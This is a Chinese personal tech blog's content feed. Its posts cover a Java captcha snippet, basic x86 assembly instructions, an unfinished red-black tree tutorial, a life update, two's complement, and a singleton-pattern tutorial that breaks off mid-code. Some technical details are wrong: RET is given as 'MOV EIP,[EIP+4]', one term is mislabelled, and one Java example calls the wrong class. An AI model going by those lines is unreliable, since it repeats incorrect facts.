BufferedImage.TYPE_3BYTE_BGR);<br><br><span class="hljs-comment">//背景色</span><br>Graphics g = image.getGraphics();<span class="hljs-comment">// 画笔对象</span><br>g.setColor(Color.PINK);<br>g.fill3DRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,width, height, <span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//边框</span><br>g.setColor(Color.blue);<br>g.draw3DRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width-<span class="hljs-number">2</span>, height-<span class="hljs-number">2</span>, <span class="hljs-keyword">true</span>);<br><br>String str = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;<br><span class="hljs-comment">//生成随即图标</span><br>Random ran = <span class="hljs-keyword">new</span> Random()；<br><br><span class="hljs-comment">//干扰线</span><br>g.setColor(Color.GREEN);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">7</span>; i++) &#123;<br>    <span class="hljs-comment">//随机生成坐标点</span><br>    <span class="hljs-keyword">int</span> x1 = ran.nextInt(width);<br>    <span class="hljs-keyword">int</span> y1 = ran.nextInt(height);<br>    <span class="hljs-keyword">int</span> x2 = ran.nextInt(width);<br>    <span class="hljs-keyword">int</span> y2 = ran.nextInt(height);<br>    g.drawLine(x1, y1, x2, y2);<br>&#125;<br><br><br><span class="hljs-comment">//验证码</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++) &#123;<br>    <span class="hljs-keyword">int</span> index = ran.nextInt(str.length());<br>    <span class="hljs-keyword">char</span> ch = str.charAt(index);<br>    g.drawString(ch+<span class="hljs-string">""</span>, width/<span class="hljs-number">10</span>*(i*<span class="hljs-number">2</span>), height/<span class="hljs-number">2</span>);<br>&#125;<br><br><br><span class="hljs-comment">//输出</span><br>ImageIO.write(image, <span class="hljs-string">"jpg"</span>, response.getOutputStream());<br></code></pre></div></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/jiachunchun/article/details/89670721" target="_blank" rel="noopener" class="LinkCard">BufferedImage类、Image类、Graphics类</a></p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编指令</title>
    <url>/article/a953fce0.html</url>
    <content><![CDATA[<p>暑假一直在想着入门pwn，询问了一位大佬，指引我怎么入门，这里记录一下汇编指令的一些基础指令。<br>汇编掌握基本指令还是难度还是不大的。</p>
<h1 id="什么是堆栈？"><a href="#什么是堆栈？" class="headerlink" title="什么是堆栈？"></a>什么是堆栈？</h1><p>1）就是一块内存，操作系统在程序启动的时候已经分配好的，供程序执行时使用。<br>2）和数据结构的堆栈无关<br>3）查看堆栈</p>
<a id="more"></a>

<p>1、mov指令 移动数据<br>2、add指令 加<br>3、sub指令 减<br>4、and指令 与<br>5、or指令 或<br>6、xor指令 异或<br>7、not指令 取反</p>
<h1 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h1><h2 id="1、movs指令"><a href="#1、movs指令" class="headerlink" title="1、movs指令"></a>1、movs指令</h2><p>mov指令：移动数据   内存-内存</p>
<p>byte/word/dword<br>movs byte ptr es:[edi],byte ptr ds:[esi]            简写为：movsb<br>movs word ptr es:[edi],word ptr ds:[esi]          简写为：movsw<br>movs dword ptr es:[edi],dword ptr ds:[esi]      简写为：movsd</p>
<h2 id="2、stos指令"><a href="#2、stos指令" class="headerlink" title="2、stos指令"></a>2、stos指令</h2><p>stos指令：将ai/ax/eax的值存储到[edi]指定的内存单元</p>
<p>stos byte ptr es:[edi]            简写为stosb<br>stos word ptr es:[edi]           简写为stosw<br>stos dword ptr es:[edi]         简写为stosd</p>
<h2 id="3、rep指令"><a href="#3、rep指令" class="headerlink" title="3、rep指令"></a>3、rep指令</h2><p>rep指令：按计数寄存器（ECX）中指定的次数重复执行字符串指令</p>
<p>MOV ECX,10<br>REP MOVSD </p>
<p>REP STOSD</p>
<h2 id="4、PUSH指令"><a href="#4、PUSH指令" class="headerlink" title="4、PUSH指令"></a>4、PUSH指令</h2><p>功能：<br>&lt;1&gt;向堆栈中压入数据<br>&lt;2&gt;修改栈顶指针ESP寄存器</p>
<h2 id="5、POP指令"><a href="#5、POP指令" class="headerlink" title="5、POP指令"></a>5、POP指令</h2><p>功能：<br>&lt;1&gt;将栈顶数据存储到寄存器/内存<br>&lt;2&gt;修改栈顶指针ESP寄存器</p>
<h1 id="修改EIP指令"><a href="#修改EIP指令" class="headerlink" title="修改EIP指令"></a>修改EIP指令</h1><h2 id="1、JMP指令"><a href="#1、JMP指令" class="headerlink" title="1、JMP指令"></a>1、JMP指令</h2><p>MOV EIP,寄存器/立即数/内存        简写为  JMP 寄存器/立即数/内存</p>
<h2 id="2、CALL指令"><a href="#2、CALL指令" class="headerlink" title="2、CALL指令"></a>2、CALL指令</h2><p>PUSH下一行地址<br>MOV EIP,立即数/寄存器/内存        简写为：CALL 立即数/寄存器/内存</p>
<p>与JMP唯一的区别：<br>在堆栈中存储CALL指令下一行地址</p>
<p>将call之后的值放到EIP中，再将call前面的下一个地址存到堆栈中</p>
<h2 id="3、RET指令"><a href="#3、RET指令" class="headerlink" title="3、RET指令"></a>3、RET指令</h2><p>ADD ESP,4<br>MOV EIP,[EIP+4]        简写为：RET</p>
<p>把堆栈中的值取出来，存到EIP中，同时将ESP的值加4；<br>所以一般ret指令与call指令连用</p>
<br>
<br>

<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>红黑树</title>
    <url>/article/f89cb603.html</url>
    <content><![CDATA[<p>在数据结构中，我认为红黑树可以说算得上是比较难理解的一种数据结构了，前几天学了红黑树，为了防止随着时间的推移慢慢淡忘，这里记录一下红黑树的实现方法：）））</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>红黑树（Red Black Tree） 是一种自平衡二叉查找树，是在计算机科学中用到的一种数据结构，典型的用途是实现关联数组。</p>
<p>就二叉树而言，我认为是非常好理解的，但红黑树是基于平衡的二叉树。可能你们不太明白有什么区别，这里我举一个例子，你就能知道二叉树其实也不是万能的！</p>
<p>假设我们往二叉树中插入9,8,7,6,5,4,3,2,1,首先插入9，再一次插入数字，你会发现什么（这图我还做了好久…）</p>
<a id="more"></a>

 <img src="https://qiniuyun1.fxhstudy.com/%E7%BA%A2%E9%BB%91%E6%A0%91.png" srcset="/img/loading.gif"  alt="1" />
  <img src="https://qiniuyun1.fxhstudy.com/%E7%BA%A2%E9%BB%91%E6%A0%911.png" srcset="/img/loading.gif"  alt="1" />

<p>是不是会发现所有的数据都是父节点的左子节点，想一想，如果这在查询的时候，效率是不是很低，原因就是这个树并不平衡。<br>这时候我们就要考虑如何使这个树平衡，让生成的树像完全二叉树那样。</p>
<h2 id="2-3-结点"><a href="#2-3-结点" class="headerlink" title="2-,3-结点"></a>2-,3-结点</h2><p>在真正接触红黑树之前，我要先介绍一下2-，3-结点。</p>
<h3 id="·-2-结点："><a href="#·-2-结点：" class="headerlink" title="· 2-结点："></a>· 2-结点：</h3><p>&ensp;&ensp;&ensp;&ensp;含有一个键(及其对用的值)和两条链，左链接的键值都小于该节点，右链接的键值都大于该结点。</p>
<h3 id="·-3-结点："><a href="#·-3-结点：" class="headerlink" title="· 3-结点："></a>· 3-结点：</h3><p>&ensp;&ensp;&ensp;&ensp;含有两个键(及其对应的值)和三条链，左链接指向树中的键都小于该结点，中链接指向树中介于该结点的两键之间，右链接指向树中的键都大于该结点。</p>
 <img src="https://qiniuyun1.fxhstudy.com/%E7%BA%A2%E9%BB%91%E6%A0%912.png" srcset="/img/loading.gif"  alt="1" />

<p>看到这幅图有没有感觉，卧槽还可以这样，的感觉。</p>
<p>而在红黑树中就可以通过链接的颜色来实现这种结构</p>
<h1 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h1><p>红黑树中的链接分为两种类型：</p>
<p>红链接：将两个2-结点连接起来，构成一个3-结点（上图中的3-结点）；<br>黑链接：是普通的节点</p>
<p>简单来说，要实现上图的那种结构，我们只需要如图所示即可</p>
 <img src="https://qiniuyun1.fxhstudy.com/%E7%BA%A2%E9%BB%91%E6%A0%913.png" srcset="/img/loading.gif"  alt="1" />

<p>E-J,就相当于C-E。</p>
<h2 id="红黑树定义"><a href="#红黑树定义" class="headerlink" title="红黑树定义"></a>红黑树定义</h2><p>1、红链接均为左链接<br>2、没有任何一个结点同时和两条红链接相连；<br>3、该树是完美黑色平衡，即任意空链接到根结点的路径上的黑链接树都相等</p>
<h2 id="红黑树中的属性"><a href="#红黑树中的属性" class="headerlink" title="红黑树中的属性"></a>红黑树中的属性</h2><p>先介绍红黑树中要用到的几个属性<br>key–键值<br>value–存储的值<br>letf–指向该结点的左节点<br>right–指向该结点的右结点<br>color–判断链接的颜色（判断的是父节点指向该结点的链接的颜色）</p>
<p>因为每个结点都有指向自己的链接（从它的父节点指向它），因此我们可以用color来表示链接的颜色，<br>如果链接为红，bool型为true，为黑，bool型为false；</p>
<div class="hljs code-wrapper"><pre><code>#define null NULL
#define true 1
#define false 0
#define Key int
#define Value int
#define LEN sizeof(struct Node)
#define bool int

//结点
struct Node
{
    /* data */
    //储存键
    Key key;
    //储存值
    Value value;
    //记录左子节点
    struct Node *left;
    //记录右子节点
    struct Node *right;
    //由其父节点指向它的链接的颜色
    bool color;
};

typedef struct Node* Tree;

//记录根节点
Tree root;
//记录树中元素的个数
int N=0;
//红色链接
#define red true
//黑色链接
#define black false</code></pre></div><p>红黑树的平衡实现</p>
<p>在对红黑树进行增删改查之后，可能会打乱红黑树的平衡，所以我们要做出一些操作来保持红黑树的平衡。</p>
<p>1、左旋；<br>2、右旋；<br>3、颜色反转</p>
<p>——————持续更新中——————</p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>聊聊最近</title>
    <url>/article/3a0bc7ed.html</url>
    <content><![CDATA[<font size="4" face="PingFang SC">

<h2 id="胡言乱语"><a href="#胡言乱语" class="headerlink" title="胡言乱语"></a>胡言乱语</h2><p>今天晚上宿舍停电了，然后无事可做，想着聊聊最近吧<br>看我的博客更新日期的话，会发现在七月底我就基本上没什么更新了。<br>因为有新的项目了，所以就断更了很久。因为这个项目的导师，也就是上次计算机设计大赛的导师，<br>对项目要求比较严格，所以很多精力都花在了这个作品上。<br>这次不是与Web有关的了，参加的是信息安全作品赛，做的是安全方向的作品。<br>这个相比后端的话，逻辑结构这块不复杂，主要就是偏Idea，这次我们做的是有关医疗数据安全的。<br>技术用到了区块链，这一块真的挺难的，环境搭建和编写相应的代码都比较复杂。<br>不过能在本科阶段用区块链做了一个小作品出来，其实也算是比较有成就感了，<br>然后接下来还有攻防赛，我的方向是逆向，去年也是这个方向，但是这次我是队长了，压力还是有点大的。<br>作品赛我也是组长，希望作品赛和攻防赛都能取得一个比较好的名次，这可能是我本科阶段最后一次参加竞赛了。</p>
<h2 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h2><p>这里想放几张我在学校拍的照片，因为我平时很少拍照片，所以自我感觉还行</p>
<p><img src="https://qiniuyun.fxhstudy.com/School1.jpg" srcset="/img/loading.gif"><br></p>
<p><img src="https://qiniuyun.fxhstudy.com/School2.jpg" srcset="/img/loading.gif"><br></p>
<p><img src="https://qiniuyun.fxhstudy.com/School3.jpg" srcset="/img/loading.gif"><br></p>
<p>可能不是很高清，因为服务器加载很慢的原因，所以原本十几兆的图片，我这里就压缩到了一百多k。<br>不过将就着看吧，我自己觉得还是好康的。</p>
<p>我们学校比较小，虽然经常抱怨这里的种种不好，但想到快要离开这里还是挺不舍的，不知道是面临毕业进入社会的彷徨、困扰，还是对这里的生活已经习惯了。</p>
<p>雀食，到了大三，也要考虑这些问题了，考研？工作？考研往哪考？工作你能不能找到一份好的工作？<br>我发现我的周围很少有人会担心这些问题，不知道是他们不愿透露，还是确实没有想到这方面去。<br>我是打算考研的，基础差就得提前准备。所以现在已经有一些想法了。只是感觉自己现在的时间比较缺乏，<br>我想在考研之前，把逆向学到能够令我满意的程度，然后Web开发这一块能够尽量往全栈发展，还有算法这一块，企业招聘肯定考你算法的。时间不够，我现在给自己订的目标就是白天-17：00是学习Web有关的知识，然后17：00-睡觉就是逆向，大致上是这两个时间段，然后英语、数学、专业课的学习看情况分配。</p>
<h2 id="最后总结"><a href="#最后总结" class="headerlink" title="最后总结"></a>最后总结</h2><p>虽然压力比较大，但生活还是要继续的，有计划总比一天一天混着强。<br>至于能够达到什么程度，尽人事，听天命</p>
</font>]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>补码的深入理解</title>
    <url>/article/78684e89.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b></p>
<p>之前我有写过关于原码补码和反码的文章，</p>
<p><a href="https://fxhstudy.com/article/2526b7ad.html" class="LinkCard">原码反码和补码</a></p>
<p>但是都是大概介绍了一下如何定义以及如何计算，并没有深究。</p>
<p>这段时间在看《深入理解计算机系统》时，正好看到关于补码的介绍，介绍得非常得详细。这里想记录关于补码的一些深度理解。</p>
<h3 id="问题引入"><a href="#问题引入" class="headerlink" title="问题引入"></a>问题引入</h3><p>在刚学C语言时，学习到关于数据类型Int时，我们会发现书上给的Int类型的取值范围是在<br><font color="#9400D3" size="3" face="Open Sans">-2 147 483 648 ~ 2 147 483 647</font><br>你有没有思考过这么一个问题，为什么取值的正负值不是对称的呢？我们会发现|Min|=|Max|+1，有人可能会考虑0，但是，0在其中起到什么作用呢？</p>
<p>其实，这就和我们接下来要说的补码有关系了。(本想从数学上来更深入讨论补码的原理，但确实很多符号打不出来，就放弃从原理层面来介绍了。)</p>
<h3 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h3><p>我们知道，在计算机中，分为有符号数和无符号数，C语言默认是有符号数，用unsigned来表示无符号数(Java只支持有符号数)。<br>其中最常见的有符号数的计算机表示方式就是补码(two’s-complement)形式。在计算机系统中，数值一律用补码来表示和存储。补码可以将符号位和数值域统一处理；同时，加法和减法也可以统一处理。</p>
<p>我们知道，其实在计算机中的所以的一切，都是由二进制组成的。<br>在程序中，我们给变量赋的值，不论多大的数，在计算机底层其实都是由0和1组成的。<br>比如，short类型的<font color="#FFB6C1" size="3" face="Open Sans">12345</font>的十六进制是<font color="#FFB6C1" size="3" face="Open Sans">0x3039</font>,转化为二进制就是<font color="#FFB6C1" size="3" face="Open Sans"> [0011 0000 0011 1001] </font></p>
<p>而short类型的<font color="#FFB6C1" size="3" face="Open Sans">-12345</font>转化为二进制是<font color="#FFB6C1" size="3" face="Open Sans"> [1011 0000 0011 1001] </font></p>
<p>我们可以发现，<font color="#FFB6C1" size="3" face="Open Sans">12345</font>和<font color="#FFB6C1" size="3" face="Open Sans">-12345</font>的二进制，其实就是最高位一个是0，一个是1。</p>
<p>在计算机中，我们将最高有效位称之为符号位，0即代表这个数为正数，而1，代表这个数为负数。</p>
<p>所以对于补码，符号位为0时，数的取值范围为<br><font color="#9400D3" size="3" face="Open Sans">0 ~ 2 147 483 647</font></p>
<p>而符号位为1时，数的取值范围为<br><font color="#9400D3" size="3" face="Open Sans">-2 147 483 648 ~ 0</font></p>
<p>正数的补码就是其原码，而负数的原码则是其反码+1。<br>所以<font color="#FFB6C1" size="3" face="Open Sans">12345</font>在计算机存储中就是按照原码来存储的，其补码等于原码。而我们所看到的<font color="#FFB6C1" size="3" face="Open Sans">-12345</font>，它的原码是<font color="#FFB6C1" size="3" face="Open Sans"> [1011 0000 0011 1001] </font>，但在存储中是按照补码来的，也就是说存储在计算机中其实是<font color="#FFB6C1" size="3" face="Open Sans"> [1100 1111 1100 0111] </font>转化为十进制是<font color="#FFB6C1" size="3" face="Open Sans">53191</font>。</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>结合以上知识，之所以会有这样的不对称性，是因为一半的位模式(符号位设置为1的数)表示负数，而另一半是(符号位设置为0的数)表示非负数。因为0是非负数，也就意味着能表示的整数比负数少一个。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实并不是很深入地理解，本想从数学角度来讨论补码的，但确实很多数学符号不好表示，所以就比较简单地介绍了一下补码。<br>如果真的想要了解数学原理，可以去看看《深入理解计算机系统》这本书，里面介绍得真的很详细。<br></b></font></p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>小知识点</tag>
        <tag>计算机原理</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式1--singleton</title>
    <url>/article/5bbda7bd.html</url>
    <content><![CDATA[<h2 id="什么是设计模式"><a href="#什么是设计模式" class="headerlink" title=" 什么是设计模式"></a><a href="https://www.runoob.com/design-pattern/design-pattern-tutorial.html" target="_blank" rel="noopener" align="center"> 什么是设计模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p>
<p>然后接下来的一段时间，我会介绍23种设计模式，掌握这23种设计模式，你的代码能力又能更上一层楼。<br>但是可能说的不是很详细，理解的不是很深，错误可能也会很多，如果有错误还请指出(不胜感激)，还是小白。</p>
<h2 id="单例模式"><a href="#单例模式" class="headerlink" title=" 单例模式"></a><a href="https://www.runoob.com/design-pattern/singleton-pattern.html" target="_blank" rel="noopener"> 单例模式</a></h2><p>&emsp;&emsp;单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。<br>这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。<br>注意：</p>
<li>单例类只能有一个实例。</li>
<li>单例类必须自己创建自己的唯一实例。</li>
<li>单例类必须给所有其他对象提供这一实例。</li>
<br/>



<p>单例模式我会介绍8种，但总体上分为四种 <font color="#FFB6C1" size="5" face="Open Sans">饿汉式</font>、<font color="#FFB6C1" size="5" face="Open Sans">懒汉式</font>、<font color="#FFB6C1" size="5" face="Open Sans">静态内部类方式</font>、<font color="#FFB6C1" size="5" face="Open Sans">枚举单例</font> 。</p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：</p>
<p>1、在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。<br>2、避免对资源的多重占用（比如写文件操作）。</p>
<p>缺点：</p>
<p>没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、要求生产唯一序列号。<br>2、WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来。<br>3、创建的一个对象需要消耗的资源过多，比如 I/O 与数据库的连接等。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><h3 id="饿汉式-Eager"><a href="#饿汉式-Eager" class="headerlink" title="饿汉式(Eager)"></a>饿汉式(Eager)</h3><h4 id="方法①"><a href="#方法①" class="headerlink" title="方法①"></a>方法①</h4><p>原理：<font color="#FF6347" size="4" face="Open Sans">类加载到内存后，就实例化一个单例，JVM保证线程安全</font></p>
<p>作用：简单实用，推荐使用</p>
<p>唯一缺点：<font color="#FF6347" size="4" face="Open Sans">不管用到与否，类装载时就完成实例化</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr01</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Mgr01 INSTANCE = <span class="hljs-keyword">new</span> Mgr01();<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mgr01</span><span class="hljs-params">()</span></span>&#123;&#125;; <span class="hljs-comment">//设置Mgr01为私有的</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Mgr01 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-comment">//作为获取单例的唯一入口</span><br>        <span class="hljs-keyword">return</span> INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"m"</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Mgr01 mgr01 = Mgr01.getInstance();<br>        Mgr01 mgr02 = Mgr01.getInstance();<br>        System.out.println(mgr01 == mgr02); <span class="hljs-comment">//用于测试是否实例是否唯一</span><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>然后有人就想了，那我不是能够在static代码块中创建实例（那么在类初次被加载的时候，执行static块，并且只会执行一次）<br>是的，所以就有了一下的代码。<hr></p>
<h4 id="方法②"><a href="#方法②" class="headerlink" title="方法②"></a>方法②</h4><p>缺点：<font color="#FF6347" size="4" face="Open Sans">同方法①</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr02</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Mgr02 INSTANCE;<br><br>    <span class="hljs-keyword">static</span>&#123;<br>        INSTANCE = <span class="hljs-keyword">new</span> Mgr02();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Mgr02 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"m"</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Mgr01 mgr01 = Mgr01.getInstance();<br>        Mgr01 mgr02 = Mgr01.getInstance();<br>        System.out.println(mgr01 == mgr02);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<hr>

<h3 id="懒汉式-Lazy-Loading"><a href="#懒汉式-Lazy-Loading" class="headerlink" title="懒汉式(Lazy Loading)"></a>懒汉式(Lazy Loading)</h3><h4 id="方法③"><a href="#方法③" class="headerlink" title="方法③"></a>方法③</h4><p>原理：<font color="#FF6347" size="4" face="Open Sans">默认不会实例化，什么时候用什么时候new</font></p>
<p>作用：按需初始化</p>
<p>缺点：<font color="#FF6347" size="4" face="Open Sans">多线程访问是会有影响的</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr03</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Mgr03 INSTANCE;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mgr03</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Mgr03 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (INSTANCE == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            INSTANCE = <span class="hljs-keyword">new</span> Mgr03();<br>        &#125;<br>        <span class="hljs-keyword">return</span> INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"m"</span>);<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123; <span class="hljs-comment">//测试多线程</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-comment">/* new Thread(new Runnable() &#123;<br>                @Override<br>                public void run() &#123;<br><br>                &#125;<br>            &#125;).start();*/</span><br>            <span class="hljs-comment">//函数式接口</span><br>            <span class="hljs-keyword">new</span> Thread(()-&gt;<br>                    System.out.println(Mgr03.getInstance().hashCode())<br>            ).start();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里存在的问题是：当存在第一个线程调用了getInstance()方法，在判断 INSTANCE 为空后，还未到实例初始化时，<br>另一线程也调用了getInstance()方法，判断了 INSTANCE 为空，往下执行 创建了实例，接着第一个线程也创建了实例，<br>此时 INSTANCE 在两个线程中已经不再是同一个实例了。</p>
<p>接着接着，就有人想到，那就用锁来限制多线程。接着就有了下面的方法：</p>
<hr>

<h4 id="方法④"><a href="#方法④" class="headerlink" title="方法④"></a>方法④</h4><p>缺点：<font color="#FF6347" size="4" face="Open Sans">通过synchronized解决多线程问题，但也带来效率下降</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr04</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Mgr04 